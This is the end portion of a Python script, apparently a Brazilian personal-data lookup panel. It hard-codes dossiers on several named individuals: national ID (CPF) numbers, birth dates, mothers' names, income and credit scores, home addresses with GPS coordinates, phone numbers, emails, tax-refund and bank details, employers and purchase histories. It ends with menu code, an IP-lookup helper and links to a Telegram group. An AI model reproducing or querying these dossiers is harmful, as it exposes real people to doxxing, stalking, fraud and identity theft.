            • POSSUI PREVIDENCIA PRIVADA Sim
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Sim
            • CREDITO PESSOAL 44% 
            • FINANCIAMENTO VEICULO 81% 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES 43% 
            • CARTAO PRIME 61% 
            • TV A CABO 76%
            • BANDA LARGA 77%
            • CASA PROPRIA 64%
            • CELULAR PRE PAGO56%
            • CELULAR POS PAGO58%
            • CREDITO MOBILARIO 25%
            • SEGURO AUTOMATIVO 71% 
            • SEGURO DE SAUDE 68%
            • SEGURO DE VIDA 56%
            • SEGURO RESIDENCIAL 39% 
            • INVESTIMENTOS 66% 
            • CONSIGNADO 50% 
            • PREVIDENCIA PRIVADA 64% 
            • RESGATE MILHAS 86%
            • CACADOR DESCONTOS62% 
            • FITNESS 76%
            • TURISMO 50% 
            • LUXO 41%
            • CINEFILIO 85%
            • TRANSPORTE PUBLICO 63% 
            • JOGOS ONLINE 77% 
            • VIDEO GAME 33%
            • EARLY ADOPTERS 54%

"""

dado38 = """

            • CPF: 03601739186
            • NOME: THIAGO CAPOZZI MONTALVAO
            • SEXO: M
            • NASCIMENTO: 1990-05-16 00:00:00
            • ESCOLARIDADE: MEDIO COMPLETO
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: MONICA CAPOZZI MONTALVAO
            • PAI: INDEFINIDO
            • RENDA: 2466
            • TÍTULO DE ELEITOR: 4

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 
            • PODER AQUISITIVO: MEDIO
            • RENDA PODER AQUISITIVO: 2466
            • FAIXA PODER AQUISITIVO: 4997760698557

            • AVALIAÇÃO DE SCORE

            • CBO: 351740
            • CSB8: 744
            • CSB8 FAIXA: BAIXISSIMO RISCO
            • CSBA: 826
            • CSBA FAIXA: BAIXISSIMO RISCO

            • ENDEREÇOS


            • CEP: 70660062
            • UF: DF
            • CIDADE: BRASILIA
            • LOGRADOURO:  AOS 6 BLOCO B
            • BAIRRO: AREA OCTOGONAL
            • NÚMERO: 
            • COMPLEMENTO: 6 BLOCOBS NAPT406
            • LAITUDE: -15.805977500000000
            • LONGITUDE: -47.946066140000000

            • CEP: 02044130
            • UF: SP
            • CIDADE: SAO PAULO
            • LOGRADOURO: R VIVEIROS DE CASTRO
            • BAIRRO: JD S PAULO ZONA NORTE
            • NÚMERO: 246
            • COMPLEMENTO: 
            • LAITUDE: -23.495586050000000
            • LONGITUDE: -46.617968450000000

            • CEP: 02044130
            • UF: SP
            • CIDADE: SAO PAULO
            • LOGRADOURO: R VIVEIROS DE CASTRO
            • BAIRRO: JD S PAULO ZONA NORTE
            • NÚMERO: 246
            • COMPLEMENTO: C
            • LAITUDE: -23.495586050000000
            • LONGITUDE: -46.617968450000000

            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 2121050000
            • OPERADORA: DESCONHECIDA

            • TELEFONE: 11945343678
            • OPERADORA: CLARO

            • TELEFONE: 6133679405
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 61999895203
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 11971527059
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 11958664477
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 1129592474
            • OPERADORA: DESCONHECIDO

            • EMAILS:

            • EMAIL: thiagocmontalvao@gmail.com
            • SCORE: OTIMO
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: thiagocapozzi@outlook.com
            • SCORE: OTIMO
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: thiago.capozzi@hotmail.com
            • SCORE: OTIMO
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: thiagovet@live.com
            • SCORE: OTIMO
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: walmirmontalvonio@uol.com.br
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • PARENTES:

            • IRPF:

            • DOCUMENTO: 03601739186
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: SALDO INEXISTENTE DE IMPOSTO A PAGAR OU A RESTITUIR
            • CPF: 03601739186

            • DOCUMENTO: 03601739186
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL
            • CPF: 03601739186

            • DOCUMENTO: 03601739186
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: SALDO INEXISTENTE DE IMPOSTO A PAGAR OU A RESTITUIR
            • CPF: 03601739186

            • DOCUMENTO: 3601739186
            • COD AGÊNCIA: 4725
            • INSTITUIÇÃO BANCÁRIA: BANCO DO BRASIL
            • LOTE: 2
            • SITUAÇÃO FDEREAL: CREDITADA
            • CPF: 03601739186

            • DOCUMENTO: 3601739186
            • COD AGÊNCIA: 4725
            • INSTITUIÇÃO BANCÁRIA: BANCO DO BRASIL
            • LOTE: 2
            • SITUAÇÃO FDEREAL: CREDITADA
            • CPF: 03601739186


            • EMPRESAS:

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • EMAIL: thiagocmontalvao@gmail.com
            • TELEFONE: NULL




            • EMAIL: thiagocmontalvao@gmail.com
            • TELEFONE: 5511958664477




            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Não
            • CREDITO IMOBILIARIO PREAPROVADOSim
            • FINACIMENTO DE VEICULO PREAPROVADOSim
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Sim
            • POSSUI LUXO Sim
            • POSSUI INVESTIMENTOS Sim
            • POSSUI CARTAO DE CREDITOSim
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Não
            • POSSUI CARTAO BLACK Não
            • POSSUI CARTAO PRIME Não
            • POSSUI CELULAR PRE PAGO Sim
            • POSSUI CELULAR POS PAGO Sim
            • POSSUI MILHAS ACUMULADAS Sim
            • POSSUI CASA PROPRIA Sim
            • POSSUI DESCONTOS Sim
            • POSSUI CONTAS CORRENTES Não
            • POSSUI SEGURO AUTOMOTIVO Sim
            • POSSUI PREVIDENCIA PRIVADA Sim
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Sim
            • CREDITO PESSOAL 38% 
            • FINANCIAMENTO VEICULO 77% 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES 31% 
            • CARTAO PRIME 53% 
            • TV A CABO 73%
            • BANDA LARGA 44%
            • CASA PROPRIA 53%
            • CELULAR PRE PAGO51%
            • CELULAR POS PAGO51%
            • CREDITO MOBILARIO 23%
            • SEGURO AUTOMATIVO 69% 
            • SEGURO DE SAUDE 54%
            • SEGURO DE VIDA 26%
            • SEGURO RESIDENCIAL 48% 
            • INVESTIMENTOS 60% 
            • CONSIGNADO 34% 
            • PREVIDENCIA PRIVADA 66% 
            • RESGATE MILHAS 64%
            • CACADOR DESCONTOS60% 
            • FITNESS 52%
            • TURISMO 48% 
            • LUXO 27%
            • CINEFILIO 69%
            • TRANSPORTE PUBLICO 38% 
            • JOGOS ONLINE 67% 
            • VIDEO GAME 63%
            • EARLY ADOPTERS 52%

"""

dado39 = """
            • DADOS PESSOAIS

            • CPF: 07926822540
            • NOME: JULIANA MOREIRA SANTOS
            • SEXO: F
            • NASCIMENTO: 2002-05-05 00:00:00
            • ESCOLARIDADE: 
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: INDEFINIDO
            • PAI: INDEFINIDO
            • RENDA: 225
            • TÍTULO DE ELEITOR: 1

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 
            • PODER AQUISITIVO: MUITO BAIXO
            • RENDA PODER AQUISITIVO: 225
            • FAIXA PODER AQUISITIVO: 843215930784

            • AVALIAÇÃO DE SCORE

            • CBO: INDEFINIDO
            • CSB8: 1
            • CSB8 FAIXA: ALTISSIMO
            • CSBA: 0
            • CSBA FAIXA: INDEFINIDO

            • ENDEREÇOS


            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 6133152425
            • OPERADORA: DESCONHECIDA

            • EMAILS:

            • PARENTES:

            • IRPF:


            • EMPRESAS:

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Não
            • CREDITO IMOBILIARIO PREAPROVADONão
            • FINACIMENTO DE VEICULO PREAPROVADONão
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Não
            • POSSUI LUXO Não
            • POSSUI INVESTIMENTOS Não
            • POSSUI CARTAO DE CREDITONão
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Não
            • POSSUI CARTAO BLACK Não
            • POSSUI CARTAO PRIME Não
            • POSSUI CELULAR PRE PAGO Não
            • POSSUI CELULAR POS PAGO Não
            • POSSUI MILHAS ACUMULADAS Não
            • POSSUI CASA PROPRIA Não
            • POSSUI DESCONTOS Não
            • POSSUI CONTAS CORRENTES Não
            • POSSUI SEGURO AUTOMOTIVO Não
            • POSSUI PREVIDENCIA PRIVADA Não
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Não
            • CREDITO PESSOAL 14% 
            • FINANCIAMENTO VEICULO Não 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES Não 
            • CARTAO PRIME 34% 
            • TV A CABO Não
            • BANDA LARGA 30%
            • CASA PROPRIA 35%
            • CELULAR PRE PAGONão
            • CELULAR POS PAGO18%
            • CREDITO MOBILARIO Não
            • SEGURO AUTOMATIVO 17% 
            • SEGURO DE SAUDE 24%
            • SEGURO DE VIDA 9%
            • SEGURO RESIDENCIAL 21% 
            • INVESTIMENTOS 17% 
            • CONSIGNADO Não 
            • PREVIDENCIA PRIVADA 31% 
            • RESGATE MILHAS Não
            • CACADOR DESCONTOS17% 
            • FITNESS 12%
            • TURISMO 39% 
            • LUXO Não
            • CINEFILIO 21%
            • TRANSPORTE PUBLICO 25% 
            • JOGOS ONLINE 44% 
            • VIDEO GAME 53%
            • EARLY ADOPTERS 15%
            
            """

dado40 = """
            • DADOS PESSOAIS

            • CPF: 21821681843
            • NOME: ALINE STYLIANOS ARABATZOGLOU
            • SEXO: F
            • NASCIMENTO: 1982-02-18 00:00:00
            • ESCOLARIDADE: SUPERIOR COMPLETO
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: SORAYA FERNANDES BORGES ARABATZOGLU
            • PAI: INDEFINIDO
            • RENDA: 821
            • TÍTULO DE ELEITOR: 1

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 12716170810
            • PODER AQUISITIVO: BAIXO
            • RENDA PODER AQUISITIVO: 821
            • FAIXA PODER AQUISITIVO: 08772482214931

            • AVALIAÇÃO DE SCORE

            • CBO: 252105
            • CSB8: 25
            • CSB8 FAIXA: ALTISSIMO
            • CSBA: 37
            • CSBA FAIXA: ALTISSIMO

            • ENDEREÇOS


            • CEP: 07115010
            • UF: SP
            • CIDADE: GUARULHOS
            • LOGRADOURO: R BRASILIA CASTANHO DE OLIVEIRA
            • BAIRRO: VL LANZARA
            • NÚMERO: 160
            • COMPLEMENTO: AP 62 AND 6
            • LAITUDE: -23.462947090000000
            • LONGITUDE: -46.529531080000000

            • CEP: 11730000
            • UF: SP
            • CIDADE: MONGAGUA
            • LOGRADOURO: AV DOMINGOS BATISTA LIMA
            • BAIRRO: VL DINOPOLIS
            • NÚMERO: 403
            • COMPLEMENTO: 
            • LAITUDE: -24.106616900000000
            • LONGITUDE: -46.649694100000000

            • CEP: 11730000
            • UF: SP
            • CIDADE: MONGAGUA
            • LOGRADOURO: AV DOMINGOS BATISTA DE LIMA
            • BAIRRO: JD OCEANOPOLIS
            • NÚMERO: 522
            • COMPLEMENTO: C 1
            • LAITUDE: -24.105699450000000
            • LONGITUDE: -46.650419770000000

            • CEP: 07115050
            • UF: SP
            • CIDADE: GUARULHOS
            • LOGRADOURO: R JOSE POSSENTI
            • BAIRRO: VL LANZARA
            • NÚMERO: 202
            • COMPLEMENTO: AND AP1 1
            • LAITUDE: -23.461756950000000
            • LONGITUDE: -46.529366050000000

            • CEP: 02324000
            • UF: SP
            • CIDADE: SAO PAULO
            • LOGRADOURO: R JOSE CORDOBA
            • BAIRRO: JD ATALIBA LEONEL
            • NÚMERO: 44
            • COMPLEMENTO: 
            • LAITUDE: -23.446857950000000
            • LONGITUDE: -46.584801020000000

            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 1124567906
            • OPERADORA: DESCONHECIDA

            • TELEFONE: 13991924812
            • OPERADORA: CLARO

            • TELEFONE: 1178086581
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 1335072849
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 11971668021
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 1135072849
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 6124417801
            • OPERADORA: DESCONHECIDO

            • EMAILS:

            • EMAIL: lika_styl@hotmail.com
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: aline@scan-leste.com.br
            • SCORE: BOM
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: DESCONHECIDO

            • EMAIL: aline@fcan-leste.com.br
            • SCORE: BOM
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: DESCONHECIDO

            • EMAIL: artesdocarvalho@gmail.com
            • SCORE: POTENCIALMENTE BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: aline.estiano@terra.com.br
            • SCORE: PESSIMO
            • PESSOAL: S
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • PARENTES:

            • CPF: 41415288895
            • NOME: MARIANA STYLIANOS ARABATZOGLOU DA CRUZ
            • PARENTESCO: MAE

            • IRPF:

            • DOCUMENTO: 21821681843
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL 
            • CPF: 21821681843

            • DOCUMENTO: 21821681843
            • COD AGÊNCIA: 0000
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 0
            • SITUAÇÃO FDEREAL: SUA DECLARACAO NAO CONSTA NA BASE DE DADOS DA RECEITA FEDERAL
            • CPF: 21821681843


            • EMPRESAS:

            • CNPJ: 11063025000150
            • NOME: ALINE STYLIANOS ARABATZOGLOU
            • CPF/CNPJ: 21821681843
            • RELAÇÃO: 
            • TIPO DE RELAÇÃO: Employee
            • FONTE: MTE
            • DEMISSÃO: 2020-10-28T00:00:00Z
            • ADEMISSÃO: 2015-02-01T00:00:00Z

            • CNPJ: 11646505000144
            • NOME: ALINE STYLIANOS ARABATZOGLOU
            • CPF/CNPJ: 21821681843
            • RELAÇÃO: OWNER
            • TIPO DE RELAÇÃO: QSA
            • FONTE: INFERENCE
            • DEMISSÃO: 2021-12-09T00:00:00Z
            • ADEMISSÃO: 2010-03-08T00:00:00Z

            • CNPJ: 11646505000144
            • NOME: ALINE STYLIANOS ARABATZOGLOU
            • CPF/CNPJ: 21821681843
            • RELAÇÃO: 
            • TIPO DE RELAÇÃO: REPRESENTANTELEGAL
            • FONTE: RECEITA FEDERAL
            • DEMISSÃO: 2018-01-25T00:00:00Z
            • ADEMISSÃO: 2018-01-25T00:00:00Z

            • CNPJ: 29831893000107
            • NOME: ALINE STYLIANOS ARABATZOGLOU
            • CPF/CNPJ: 21821681843
            • RELAÇÃO: OWNER
            • TIPO DE RELAÇÃO: QSA
            • FONTE: INFERENCE
            • DEMISSÃO: 2021-12-16T00:00:00Z
            • ADEMISSÃO: 2018-03-02T00:00:00Z

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • EMAIL: lika_styl@hotmail.com
            • TELEFONE: 551143211234




            • EMAIL: lika_styl@hotmail.com
            • TELEFONE: 551143211234



            • PRODUTO: Neoliberalismo Trabalho e Sindicatos
            • PREÇO: 70.00
            • QUANTIDADE: 
            • DETALHE: Brochura com 129 pags sem grifos e anotaçoes!


            • EMAIL: lika_styl@hotmail.com
            • TELEFONE: 551143211234




            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Sim
            • CREDITO IMOBILIARIO PREAPROVADOSim
            • FINACIMENTO DE VEICULO PREAPROVADONão
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Sim
            • POSSUI LUXO Sim
            • POSSUI INVESTIMENTOS Sim
            • POSSUI CARTAO DE CREDITOSim
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Não
            • POSSUI CARTAO BLACK Não
            • POSSUI CARTAO PRIME Não
            • POSSUI CELULAR PRE PAGO Sim
            • POSSUI CELULAR POS PAGO Sim
            • POSSUI MILHAS ACUMULADAS Sim
            • POSSUI CASA PROPRIA Sim
            • POSSUI DESCONTOS Sim
            • POSSUI CONTAS CORRENTES Sim
            • POSSUI SEGURO AUTOMOTIVO Sim
            • POSSUI PREVIDENCIA PRIVADA Sim
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Sim
            • CREDITO PESSOAL 71% 
            • FINANCIAMENTO VEICULO 39% 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES 43% 
            • CARTAO PRIME 54% 
            • TV A CABO 62%
            • BANDA LARGA 77%
            • CASA PROPRIA 72%
            • CELULAR PRE PAGO60%
            • CELULAR POS PAGO68%
            • CREDITO MOBILARIO 55%
            • SEGURO AUTOMATIVO 61% 
            • SEGURO DE SAUDE 74%
            • SEGURO DE VIDA 68%
            • SEGURO RESIDENCIAL 46% 
            • INVESTIMENTOS 70% 
            • CONSIGNADO 51% 
            • PREVIDENCIA PRIVADA 75% 
            • RESGATE MILHAS 47%
            • CACADOR DESCONTOS51% 
            • FITNESS 54%
            • TURISMO 65% 
            • LUXO 21%
            • CINEFILIO 69%
            • TRANSPORTE PUBLICO 53% 
            • JOGOS ONLINE 62% 
            • VIDEO GAME 38%
            • EARLY ADOPTERS 51%

"""

dado41 = """
            • DADOS PESSOAIS

            • CPF: 85198200182
            • NOME: IZALDINO JOSE FERREIRA DE MENEZES
            • SEXO: M
            • NASCIMENTO: 1978-10-11 00:00:00
            • ESCOLARIDADE: MEDIO COMPLETO
            • ESTADO CÍVIL: INDEFINIDO
            • MÃE: ILDA CASTRO DE MENEZES
            • PAI: INDEFINIDO
            • RENDA: 962
            • TÍTULO DE ELEITOR: 1

            • REGISTRO GERAL

            • RG: INDEFINIDO
            • UF EMISSÃO: INDEFINIDO
            • ORGÃO EMISSOR: INDEFINIDO

            • PIS: 19018571329
            • PODER AQUISITIVO: BAIXO
            • RENDA PODER AQUISITIVO: 962
            • FAIXA PODER AQUISITIVO: 96278190445707

            • AVALIAÇÃO DE SCORE

            • CBO: INDEFINIDO
            • CSB8: 80
            • CSB8 FAIXA: ALTISSIMO
            • CSBA: 203
            • CSBA FAIXA: ALTO

            • ENDEREÇOS


            • CEP: 77370000
            • UF: TO
            • CIDADE: NATIVIDADE
            • LOGRADOURO:  A
            • BAIRRO: 
            • NÚMERO: 210
            • COMPLEMENTO: 
            • LAITUDE: -11.712983400000000
            • LONGITUDE: -47.729785130000000

            • CEP: 77370000
            • UF: TO
            • CIDADE: NATIVIDADE
            • LOGRADOURO:  A
            • BAIRRO: 
            • NÚMERO: 210
            • COMPLEMENTO: 
            • LAITUDE: -11.712983400000000
            • LONGITUDE: -47.729785130000000

            • CEP: 77370000
            • UF: TO
            • CIDADE: NATIVIDADE
            • LOGRADOURO: R A
            • BAIRRO: NATIVIDADE
            • NÚMERO: 210
            • COMPLEMENTO: SETO GI
            • LAITUDE: -11.713418070000000
            • LONGITUDE: -47.728640590000000

            • CEP: 77370000
            • UF: TO
            • CIDADE: NATIVIDADE
            • LOGRADOURO: R A
            • BAIRRO: 
            • NÚMERO: 210
            • COMPLEMENTO: 
            • LAITUDE: -11.724145360000000
            • LONGITUDE: -47.735202510000000

            • CEP: 77370000
            • UF: TO
            • CIDADE: NATIVIDADE
            • LOGRADOURO: R A
            • BAIRRO: CENTRO
            • NÚMERO: 210
            • COMPLEMENTO: LT 11 9
            • LAITUDE: -11.724145360000000
            • LONGITUDE: -47.735202510000000

            • NACIONALIDADE: INDEFINIDO

            • TELEFONES:

            • TELEFONE: 63992156236
            • OPERADORA: DESCONHECIDA

            • TELEFONE: 63999501919
            • OPERADORA: VIVO

            • TELEFONE: 63992475404
            • OPERADORA: CLARO

            • TELEFONE: 63991140560
            • OPERADORA: CLARO

            • TELEFONE: 63991035706
            • OPERADORA: CLARO

            • TELEFONE: 63992739095
            • OPERADORA: CLARO

            • TELEFONE: 63992135592
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 6333721167
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 6333721172
            • OPERADORA: DESCONHECIDO

            • TELEFONE: 63984903443
            • OPERADORA: DESCONHECIDO

            • EMAILS:

            • EMAIL: dino.olindo@hotmail.com
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: ruralnat@yahoo.com
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: ruralnat@yahoo.com.br
            • SCORE: BOM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • EMAIL: ijf_menezes@yahoo.com.br
            • SCORE: RUIM
            • PESSOAL: N
            • ESTRUTURA: VALIDA
            • DOMÍNIO: PUBLICO

            • PARENTES:

            • IRPF:

            • DOCUMENTO: 85198200182
            • COD AGÊNCIA: 2334
            • INSTITUIÇÃO BANCÁRIA: BANCO DO BRASIL
            • LOTE: 2
            • SITUAÇÃO FDEREAL: CREDITADA
            • CPF: 85198200182

            • DOCUMENTO: 85198200182
            • COD AGÊNCIA: 
            • INSTITUIÇÃO BANCÁRIA: 
            • LOTE: 
            • SITUAÇÃO FDEREAL: IMPOSTO A PAGAR
            • CPF: 85198200182

            • DOCUMENTO: 85198200182
            • COD AGÊNCIA: 2334
            • INSTITUIÇÃO BANCÁRIA: BANCO DO BRASIL S.A.
            • LOTE: 3
            • SITUAÇÃO FDEREAL: CREDITADA 
            • CPF: 85198200182

            • DOCUMENTO: 85198200182
            • COD AGÊNCIA: 2334
            • INSTITUIÇÃO BANCÁRIA: BANCO DO BRASIL
            • LOTE: 2
            • SITUAÇÃO FDEREAL: CREDITADA
            • CPF: 85198200182


            • EMPRESAS:

            • CNPJ: 25053190000136
            • NOME: IZALDINO JOSE FERREIRA DE MENEZES
            • CPF/CNPJ: 85198200182
            • RELAÇÃO: 
            • TIPO DE RELAÇÃO: Employee
            • FONTE: MTE
            • DEMISSÃO: 2022-02-20T00:00:00Z
            • ADEMISSÃO: 2019-11-01T00:00:00Z

            • COMPRAS ONLINE:

            • ORDENS DE COMPRAS:

            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236



            • PRODUTO: Compromisso de Ajustamento de Conduta
            • PREÇO: 39.50
            • QUANTIDADE: 
            • DETALHE: livro novo. Este livro analisa o compromisso de ajustamento de conduta TAC como instrumento de acesso à justiça no Ministério Público. A teoria discursiva do direito de Jürgen Habermas é o marco teórico da pesquisa e permite enfrentar a legitimidade

            • PRODUTO: A Subordinação no Contrato de Trabalho
            • PREÇO: 51.35
            • QUANTIDADE: 
            • DETALHE: Livro novo adquirido diretamente da editora. Em que consiste a subordinação na relação de emprego? Em face das mudanças no mundo do trabalho, é necessário um novo conceito de subor-dinação? E a parassubordinação: avanço ou retrocesso? Esta obra busc


            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236



            • PRODUTO: Compra de Cartão Azul Digital - 2 unidades
            • PREÇO: 10.00
            • QUANTIDADE: 
            • DETALHE: 


            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236




            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236



            • PRODUTO: PLACA PET (Dados enviar por Mensagem )
            • PREÇO: 18.50
            • QUANTIDADE: 
            • DETALHE: NULL


            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236




            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236




            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236




            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236




            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236




            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236



            • PRODUTO: Forever Liss Red Kit Tratamento Manutenção
            • PREÇO: 46.90
            • QUANTIDADE: 
            • DETALHE: KITFLRED

            • PRODUTO: Richée Clinic Repair System Máscara Revitalizante 500g
            • PREÇO: 54.90
            • QUANTIDADE: 
            • DETALHE: 042.CRP


            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236



            • PRODUTO: Compra de Cartão Azul Digital - 1 unidades
            • PREÇO: 5.00
            • QUANTIDADE: 
            • DETALHE: 


            • EMAIL: ijf_menezes@yahoo.com.br
            • TELEFONE: 5563992156236



            • PRODUTO: O Teatro de Nelson Rodrigues - Uma Leitura Psicanalítica
            • PREÇO: 7.00
            • QUANTIDADE: 
            • DETALHE: Brochura; extremidades com sinais de desgaste; laterais amareladas; bom estado geral


            • INTERESSES:

            • CREDITO PESSOAL PREAPROVADO Sim
            • CREDITO IMOBILIARIO PREAPROVADONão
            • FINACIMENTO DE VEICULO PREAPROVADOSim
            • CLASSE MEDIANão
            • DEBITO AUTOMATICO Sim
            • POSSUI LUXO Sim
            • POSSUI INVESTIMENTOS Sim
            • POSSUI CARTAO DE CREDITOSim
            • POSSUI MULTIPLOS CARTOES Não
            • POSSUI CONTA ALTO PADRAO Não
            • POSSUI CARTAO BLACK Não
            • POSSUI CARTAO PRIME Não
            • POSSUI CELULAR PRE PAGO Sim
            • POSSUI CELULAR POS PAGO Não
            • POSSUI MILHAS ACUMULADAS Sim
            • POSSUI CASA PROPRIA Sim
            • POSSUI DESCONTOS Não
            • POSSUI CONTAS CORRENTES Não
            • POSSUI SEGURO AUTOMOTIVO Sim
            • POSSUI PREVIDENCIA PRIVADA Não
            • POSSUI interessesERNET BANKING 
            • POSSUI TOKEN INSTALADO Sim
            • REALIZOU VIAGENS Não
            • CREDITO PESSOAL 65% 
            • FINANCIAMENTO VEICULO 81% 
            • COMPRA interessesERNET 
            • MULTIPLOS CARTOES 56% 
            • CARTAO PRIME 27% 
            • TV A CABO 67%
            • BANDA LARGA 57%
            • CASA PROPRIA 67%
            • CELULAR PRE PAGO56%
            • CELULAR POS PAGO33%
            • CREDITO MOBILARIO 12%
            • SEGURO AUTOMATIVO 53% 
            • SEGURO DE SAUDE 48%
            • SEGURO DE VIDA 60%
            • SEGURO RESIDENCIAL 43% 
            • INVESTIMENTOS 54% 
            • CONSIGNADO 31% 
            • PREVIDENCIA PRIVADA 43% 
            • RESGATE MILHAS 56%
            • CACADOR DESCONTOS41% 
            • FITNESS 55%
            • TURISMO 34% 
            • LUXO 4%
            • CINEFILIO 48%
            • TRANSPORTE PUBLICO 31% 
            • JOGOS ONLINE 44% 
            • VIDEO GAME 60%
            • EARLY ADOPTERS 53%

"""

dados = {
    "1": dado1,
    "2": dado2,
    "3": dado3,
    "4": dado4,
    "5": dado5,
    "6": dado6,
    "7": dado7,
    "8": dado8,
    "9": dado9,
    "10": dado10,
    "11": dado11,
    "12": dado12,
    "13": dado13,
    "14": dado14,
    "15": dado15,
    "16": dado16,
    "17": dado17,
    "18": dado18,
    "19": dado19,
    "20": dado20,
    "21": dado21,
    "22": dado22,
    "23": dado23,
    "24": dado24,
    "25": dado25,
    "26": dado26,
    "27": dado27,
    "28": dado28,
    "29": dado29,
    "30": dado30,
    "31": dado31,
    "32": dado32,
    "33": dado33,
    "34": dado34,
    "35": dado35,
    "36": dado36,
    "37": dado37,
    "38": dado38,
    "39": dado39,
    "40": dado40,
    "41": dado41,
}

def backmenu():
    backmenu = input("[+] Voltar ao menu?(sim/não): ")
    if backmenu in ["ss", "sim", "s"]:
        menu()
    else:
        if sistema == "Windows":
            os.system('cls')
        else:
            os.system('clear')
        exit()

def iplookup(ip):
    urlapi = f"https://ipinfo.io/{ip}/json"
    try:
        requisição = requests.get(urlapi)
        if requisição.status_code == 200:
            responsejson = requisição.json()
            dados = responsejson
            return dados
        else:
            return None
    except requests.RequestException as e:
        return None

def linksjogos():
    print("""				Links de Joguinhos 👾

DOOM android 🔥: https://t.me/undergrupo/55370

Dota android: https://t.me/undergrupo/55372

